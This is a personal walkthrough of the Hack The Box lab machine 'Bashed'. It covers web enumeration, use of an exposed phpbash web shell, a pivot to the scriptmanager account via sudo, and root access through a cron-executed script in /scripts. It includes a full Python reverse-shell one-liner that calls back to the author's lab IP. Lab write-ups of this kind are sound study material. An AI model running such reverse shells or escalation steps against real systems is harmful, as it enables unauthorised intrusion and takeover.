# Bashed

Bashed

Wednesday, 2 February 2022

8:35 pm

&#x20;

This is a Linux machine.

My IP address is 10.10.16.4.

Target IP address is 10.10.10.68.

&#x20;

Initial nmap scan reveals this is another port 80 machine. Further scanning would reveal that I am dealing with **Apache 2.4.18, and it's title is Arrexel's Development Site.** Another Nmap scan using the vuln script shows nothing of interest.

!\[\[12\_Bashed\_image001.png]]

&#x20;

Gobuster directory enumerates out some directories as well.

!\[\[12\_Bashed\_image002.png]]

&#x20;

When visiting the website, it tells us something about phpbash. This seems to be some form of web exploit that allows us to gain a shell into the web server that is hosting it, whereby we are the www-data user. Reading the github, it is accessed by going to the **/uploads/phpbash.php** directory. The author of the site has stated that he has run it and we need to be able to execute the php codes as such, In this case we need to see if we can start port configuration back to our machine.

&#x20;

We can access this php code via the /dev directory. This instantly gives us a web shell! From here, we can get the user flag!

&#x20;

!\[\[12\_Bashed\_image003.png]]

&#x20;

However, we do not have root privileges yet. As such, we need to find ways to execute some stuff.

Checking what we can execute gives us an idea of how to continue.

&#x20;

!\[\[12\_Bashed\_image004.png]]

&#x20;

Seems that that user can run everything, so we need to check what he can run currently on the machine. But first, we need to get out of this shell and put it on Kali as we're still stuck in the web browser. We can do this as such:

&#x20;

**Python -c 'import socket,os,pty;s=socket.socket(socket.AF\_INET,socket.SOCK\_STREAM);s.connect(("10.10.16.4",1111));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'**

&#x20;

Execute this and have a listener port and we can spawn a reverse shell easily. From there, we can start to execute other codes and stuff. From here, we already know that we are allowed to execute codes from scriptmanager account. Using **sudo -lu scriptmanager /bin/bash**, we are able to spawn in a terminal that allows us to access the scriptmanager account.

!\[\[12\_Bashed\_image005.png]]

&#x20;

Taking a look around, there seems to be nothing of interest to my eye. From here, I did **ls -al** to check on what is interesting. Weird thing is that the scriptmanager account is allowed to execute stuff from /scripts directory. Inside there, there is a test.py and a test.txt.

!\[\[12\_Bashed\_image006.png]]

&#x20;

The code for the python script seems to open the test.txt and then write to it. So the test.txt is produced by the python script. Interestingly, the test.py script is owned by scriptmanager.

!\[\[12\_Bashed\_image007.png]]

Interesting! The script is owned by script manager. When I viewed the ls -la again, it seems that test.txt was updated yet again! This would mean something is executing it over and over, making sure that the test.txt file is new.

!\[\[12\_Bashed\_image008.png]]

&#x20;

The answer was simple, I just need to run this script as a reverse shell somehow, and that will get me the root account. I made a simple script that would connect me back to the web server. I then opened up a HTTP server.

!\[\[12\_Bashed\_image009.png]]

&#x20;

!\[\[12\_Bashed\_image0010.png]]

&#x20;

After which, I transferred the file over to the /script directory and made it executable.

!\[\[12\_Bashed\_image0011.png]]

&#x20;

Understanding that the script was just waiting to be executed, I just waited with the listener port and lo and behold, we gain the root shell.

{width="6.770833333333333in" height="8.114583333333334in"}

&#x20;

Overall, a great box.

&#x20;

The things I learnt was how to create a simple python reverse shell script, as shown. The next thing I have learnt was that it important to **monitor the processes using ls -la** in order to **determine what are executables that we can easily exploit.** After identifying /script, I was able to create a simple script, understanding that the whole /script folder was being executed over and over again by root.

&#x20;

Things that I could have done differently would be to determine the total processes running using applications like pspy. This would have made it clearer to me, as I might have had to replace the entire test.py file with my own code. Other methods would include writing over a totally new python script that would give me the reverse shell.wd
